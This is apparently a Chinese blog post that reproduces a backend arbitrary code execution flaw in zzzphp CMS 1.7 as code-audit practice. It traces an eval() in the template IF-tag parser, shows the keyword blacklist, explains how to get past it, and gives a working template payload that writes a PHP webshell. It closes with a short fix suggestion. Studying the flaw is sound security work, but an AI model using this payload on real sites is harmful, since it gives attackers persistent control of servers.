## 前言

有一段时间没有练习代码审计了。复现`zzzphp1.7`版本后台存在的一个任意代码执行漏洞。现在立一个`flag`:一周一套`cms`，先从复现开始，总有一天我也能挖出自己的`0day`。



## 代码审计

`index.php`调用`zzz_client.php`，跟进到这个文件的56行。

```php
 require 'zzz_template.php';
 if (conf('webmode')==0) error(conf('closeinfo'));
 $location=getlocation();
 ParseGlobal(G('sid'),G('cid'));
 //echop($location);die;
 switch ($location) {
	case 'about':
	 	$tplfile= TPL_DIR . G('stpl');
		break; 
	case 'brand':		
	... ...
    default:
	 	$tplfile=is_file(TPL_DIR . $location.'.html') ? TPL_DIR . $location.'.html'  : TPL_DIR .'index.html' ;
		break; 		
 }    
```

`getlocation()`函数用于导入模块，这个根据`url`获取。比如访问`http://127.0.0.1/search`那么模块解析时，`$location=search`。跟进到代码185行

```php
elseif($conf['runmode']==0|| $conf['runmode']==2 || $location=='search' ||$location=='form' ||$location=='screen' || $location=='app'){
	$zcontent = load_file($tplfile,$location);
	$parser = new ParserTemplate();
	$zcontent = $parser->parserCommom($zcontent); // 解析模板
	echo $zcontent;
 }
```

这里解析模块，跟进函数`$zcontent = $parser->parserCommom($zcontent);`

```php
	public
	function parserCommom( $zcontent ) {
		$zcontent = $this->parserSiteLabel( $zcontent ); // 站点标签
		$zcontent = $this->ParseInTemplate( $zcontent ); // 模板标签
		$zcontent = $this->parserConfigLabel( $zcontent ); //配置表情
		$zcontent = $this->parserSiteLabel( $zcontent ); // 站点标签
		$zcontent = $this->parserCompanyLabel( $zcontent ); // 公司标签
		$zcontent = $this->parserUser( $zcontent ); //会员信息
		$zcontent = $this->parserlocation( $zcontent ); // 站点标签
		$zcontent = $this->parserLoopLabel( $zcontent ); // 循环标签		
		$zcontent = $this->parserContentLoop( $zcontent ); // 指定内容
		$zcontent = $this->parserbrandloop( $zcontent );
		$zcontent = $this->parserGbookList( $zcontent );		
		$zcontent = $this->parserLabel( $zcontent ); // 指定内容
		$zcontent = $this->parserPicsLoop( $zcontent ); // 内容多图
		$zcontent = $this->parserad( $zcontent );
		$zcontent = parserPlugLoop( $zcontent );
		$zcontent = $this->parserOtherLabel( $zcontent );
		$zcontent = $this->parserIfLabel( $zcontent ); // IF语句
		$zcontent = $this->parserNoLabel( $zcontent );
		return $zcontent;
	}
```

跟进函数`$zcontent = $this->parserIfLabel( $zcontent ); // IF语句`

```php

	// 解析IF条件标签
	public
	function parserIfLabel( $zcontent ) {
		$pattern = '/\{if:([\s\S]+?)}([\s\S]*?){end\s+if}/';
		if ( preg_match_all( $pattern, $zcontent, $matches ) ) {
			$count = count( $matches[ 0 ] );
			for ( $i = 0; $i < $count; $i++ ) {
				$flag = '';
				$out_html = '';
				$ifstr = $matches[ 1 ][ $i ];
				$ifstr=danger_key($ifstr);
				$ifstr = str_replace( '=', '==', $ifstr );	
				$ifstr = str_replace( '<>', '!=', $ifstr );
				$ifstr = str_replace( 'or', '||', $ifstr );
				$ifstr = str_replace( 'and', '&&', $ifstr );
				$ifstr = str_replace( 'mod', '%', $ifstr );						
				//echop( $ifstr);
				@eval( 'if(' . $ifstr . '){$flag="if";}else{$flag="else";}' );
```

`eval()`这个函数会造成代码执行，所以我们只要有办法绕过这里的过滤，然后在后台修改`search.html`，写入`if标签的shell`，解析后就能造成任意代码执行。



问题在与如何绕过这些个过滤。

```
$pattern = '/\{if:([\s\S]+?)}([\s\S]*?){end\s+if}/';
```

要求代码格式如下：

```
{if:条件} 代码 {end if}
```



第二个限制`$ifstr=danger_key($ifstr);`，跟进`danger_key()`

```php
function danger_key( $s , $len=255) {
　　　　　　$danger=array('php','preg','server','chr','decode','html','md5','post','get','cookie','session','sql','del','encrypt','upload','db','$','system','exec','shell','popen','eval');   
    $s = str_ireplace($danger,"*",$s);
	return $s;
}
```

危险字符替换，可使用双写绕过。



## exp构造

问题１：危险字符替换会将字符替换成'*'，使用`str_replace`替换回来。

问题２：`$`被替换了，没办法用双写绕过，使用`get_defined_vars()`来构造，参考[https://y4er.com/post/apache-nginx-webshell/](https://y4er.com/post/apache-nginx-webshell/)

后台 - 模板管理 - 修改`search.html`，添加一行

最终exp如下：

```
{if:1)file_put_contents(str_replace('*','','Y4er.pphphp'),str_replace('*','','<?pphphp evevalal(ggetet_defined_vars()[_PPOSTOST][1]);'));//}{end if}
```



## 修复

使用`preg_replace`过滤关键字而不是`str_ireplace()`，严格控制用户输入。











